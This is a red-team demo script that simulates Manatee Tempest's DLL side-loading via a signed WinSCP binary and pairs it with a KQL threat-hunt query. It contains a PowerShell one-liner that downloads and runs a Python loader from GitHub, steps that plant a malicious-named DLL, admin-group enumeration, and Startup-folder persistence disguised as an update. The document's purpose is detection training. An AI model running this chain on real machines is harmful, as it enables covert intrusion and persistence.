# Manatee Tempest Simulation V6: Demo Script

## 1. The Narrative (Introduction)

**The Actor:** Manatee Tempest (SocGholish / Raspberry Robin).

**The Scenario:** A user has been tricked into executing a small command. This version demonstrates the most advanced evasion technique in the series: **DLL side-loading**. The attacker downloads a legitimate, signed application (WinSCP) and places a malicious DLL alongside it. When WinSCP runs, it automatically loads the DLL — executing attacker code under the identity of a trusted process.

**Key Difference from V1-V5:** Python is only the installer. After setup, persistence fires **WinSCP.exe** (a trusted, signed file transfer tool), which side-loads the DLL. Python never appears in the persistence chain.

**MITRE Techniques:**
- T1574.002 — Hijack Execution Flow: DLL Side-Loading
- T1547.001 — Boot or Logon Autostart Execution: Startup Folder
- T1069.001 — Permission Groups Discovery: Local Groups

---

## 2. Execution Steps & Talking Points

### Step A: The Ingress (Living off the Land)

**Action:** Run the PowerShell command (Stage 0).

```powershell
powershell.exe -Command "curl.exe -L https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -o C:\ProgramData\python.zip; curl.exe -L https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/refs/heads/main/V6/stage1.py -o C:\ProgramData\hklib.py; Expand-Archive -LiteralPath C:\ProgramData\python.zip -DestinationPath C:\ProgramData\py3 -Force; del C:\ProgramData\python.zip; & C:\ProgramData\py3\python.exe C:\ProgramData\hklib.py"
```

**Narrative:** "We start with a single line of PowerShell. We use curl.exe to pull a legitimate Python environment and our loader from GitHub. This bypasses many basic file-reputation filters because the traffic goes to trusted domains."

---

### Step B: WinSCP Staging

**Action:** Python downloads WinSCP portable from the official website and extracts it.

**Narrative:** "Our loader downloads WinSCP — a legitimate, digitally signed file transfer tool used by thousands of sysadmins worldwide. It's downloaded from the official source. We extract it into `C:\ProgramData\WinSCP\`. There's nothing malicious about this binary; it's a clean, signed executable."

**Visual Check:** `dir C:\ProgramData\WinSCP\WinSCP.exe`

---

### Step C: DLL Staging (WTSAPI32.dll)

**Action:** Python downloads the malicious DLL as `WTSAPI32.dll` into the WinSCP directory.

**Narrative:** "Now the trap. We place our payload DLL alongside WinSCP — named `WTSAPI32.dll`. This is a real Windows API DLL that WinSCP tries to load from its own directory before falling back to System32. By naming our DLL with this exact name, WinSCP will load it automatically."

**Visual Check:** `dir C:\ProgramData\WinSCP\WTSAPI32.dll`

---

### Step D: Environment Discovery (Local Admin Enumeration)

**Action:** The script runs `net localgroup Administrators`.

**Narrative:** "Before establishing persistence, the script enumerates the local Administrators group. This is a classic discovery technique (MITRE T1069.001)."

**Technical Check:** Review `C:\ProgramData\stage1.log`.

---

### Step E: Persistence (Startup .bat → WinSCP.exe)

**Action:** Drops `WinUpdate.bat` into the Startup folder.

**Narrative:** "For persistence, we write a `.bat` file to the Startup folder — but here's the twist: **it points to WinSCP.exe, not Python**. On every logon, Windows runs the .bat, which launches WinSCP, which side-loads our DLL. An analyst reviewing the Startup folder sees a reference to a well-known admin tool. No Python, no scripts — just WinSCP."

**Technical Check:**
```powershell
type "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdate.bat"
```

Expected output:
```
@echo off
"C:\ProgramData\WinSCP\WinSCP.exe"
```

---

### Step F: Side-Load Trigger

**Action:** The script launches `WinSCP.exe`, which side-loads `WTSAPI32.dll`.

**Narrative:** "Finally, we trigger the side-load. WinSCP starts, looks for `WTSAPI32.dll` in its directory, finds ours, and loads it. Our `DllMain` function executes — writing a timestamped entry to `hello.log`. WinSCP will crash shortly after because our DLL doesn't implement the real WTSAPI32 functions — but our code has already executed. In a real attack, the DLL would proxy calls to the real system DLL to avoid this crash."

**Technical Check:**
```powershell
type C:\ProgramData\WinSCP\hello.log
```

Expected output:
```
2026-02-17 22:48:00 - DLL persistence active (side-loaded) in: C:\ProgramData\WinSCP
```

> **Note:** WinSCP will crash/close after loading the DLL. This is expected in a demo environment. The `hello.log` file proves the side-load executed successfully.

---

### Step G: Validation (The Logs)

**Action:** Review both log files.

**stage1.log** (Python installer log):
```
[OK] WinSCP staged to C:\ProgramData\WinSCP
[OK] DLL staged as WTSAPI32.dll at C:\ProgramData\WinSCP\WTSAPI32.dll
=== Local Admin Group ===
...
=========================
[OK] Persistence: Startup .bat -> WinSCP.exe (side-loads WTSAPI32.dll)
[OK] Side-load triggered: C:\ProgramData\WinSCP\WinSCP.exe -> WTSAPI32.dll loaded
```

**hello.log** (DLL execution log — proof of side-load):
```
2026-02-17 22:48:00 - DLL persistence active (side-loaded) in: C:\ProgramData\WinSCP
```

**Cleanup:**
```powershell
del "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdate.bat"
Remove-Item "C:\ProgramData\WinSCP" -Recurse -Force
del C:\ProgramData\stage1.log
Remove-Item C:\ProgramData\py3 -Recurse -Force
del C:\ProgramData\hklib.py
```

---

## 3. KQL Threat Hunt Query

```kql
// ══════════════════════════════════════════════════════════
// Threat Hunt: DLL Side-Loading via WinSCP (V6)
// Detects the full kill chain across 3 telemetry tables
// ══════════════════════════════════════════════════════════
let Python_NonStandard = 
    DeviceProcessEvents
    | where FileName =~ "python.exe" or FileName =~ "python3.exe"
    | where not(FolderPath has_any (
        "Program Files", "Program Files (x86)", 
        "AppData\\Local\\Programs\\Python",
        "AppData\\Local\\Microsoft\\WindowsApps"
    ))
    | extend Tactic_Detected = "Python Non-Standard Location"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected, 
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Enumeration =
    DeviceProcessEvents
    | where FileName == "net.exe" or FileName == "net1.exe"
    | where ProcessCommandLine has "localgroup" 
        and ProcessCommandLine has "Administrators"
    | extend Tactic_Detected = "Enumeration"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let SideLoad_Process =
    DeviceProcessEvents
    | where FileName =~ "WinSCP.exe"
    | where not(FolderPath has_any ("Program Files", "Program Files (x86)"))
    | extend Tactic_Detected = "Signed Binary Non-Standard Path"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine,
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let SideLoad_DLL =
    DeviceImageLoadEvents
    | where FileName =~ "WTSAPI32.dll"
    | where not(FolderPath startswith @"C:\Windows")
    | where InitiatingProcessFileName =~ "WinSCP.exe"
    | extend Tactic_Detected = "DLL Side-Load"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, FileName,
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Persistence =
    DeviceFileEvents
    | where FolderPath has @"\Start Menu\Programs\Startup"
    | where FileName endswith ".bat" or FileName endswith ".cmd"
    | where ActionType == "FileCreated"
    | extend Tactic_Detected = "Startup Persistence"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, FileName,
              InitiatingProcessFileName, InitiatingProcessParentFileName;
// ── Combine and summarize ──
union Python_NonStandard, Enumeration, SideLoad_Process, SideLoad_DLL, Persistence
| summarize 
    Tactics = make_set(Tactic_Detected),
    Tactic_Count = dcount(Tactic_Detected),
    Parent_Processes = make_set(InitiatingProcessFileName),
    GrandParent_Processes = make_set(InitiatingProcessParentFileName),
    Commands = make_set(ProcessCommandLine),
    Paths = make_set(FolderPath),
    First_Seen = min(Timestamp),
    Last_Seen = max(Timestamp),
    Event_Count = count()
    by DeviceName, AccountName
| extend Risk = case(
    Tactic_Count >= 4, "CRITICAL", 
    Tactic_Count == 3, "HIGH", 
    Tactic_Count == 2, "MEDIUM", 
    "LOW")
| sort by Tactic_Count desc
```

---

## 4. Summary for Security Analysts

**Detection Strategy:** This is a multi-layered hunt. The KQL query correlates five distinct signals across three Advanced Hunting tables (`DeviceProcessEvents`, `DeviceImageLoadEvents`, `DeviceFileEvents`). No single signal is high-confidence alone — the power is in the correlation.

**Why This Is Hard to Detect:**
- WinSCP.exe is **digitally signed** by a trusted publisher
- WTSAPI32.dll is loaded via normal Windows DLL search order — no injection
- The Startup .bat references a **legitimate application**, not a script
- Python disappears after setup — it's never the persistent process

**V1 → V6 Evolution:**
| Signal | V1 | V2 | V3 | V4 | V5 | V6 |
|--------|----|----|----|----|----|----|
| Persistence | Sched Task | Sched Task | Reg Run | Startup .bat | COM Task | .bat → WinSCP |
| Execution | `rundll32` | `python.exe` | `python.exe` | `python.exe` | `python.exe` | WinSCP (side-load) |
| DLL used? | Executed | Staged only | Staged only | Staged only | Staged only | **Side-loaded** |
| Child process noise | `schtasks` | `schtasks` | None | None | None | None |
| Signed parent? | No | No | No | No | No | **Yes** |
| Tables to hunt | 1 | 1 | 1 | 2 | 1 | **3** |
| MITRE (persist) | T1053.005 | T1053.005 | T1547.001 | T1547.001 | T1053.005 | T1547.001 |
| MITRE (exec) | T1218.011 | — | — | — | — | **T1574.002** |

**Impact:** This access is what Manatee Tempest sells to ransomware operators to facilitate the final encryption stage.
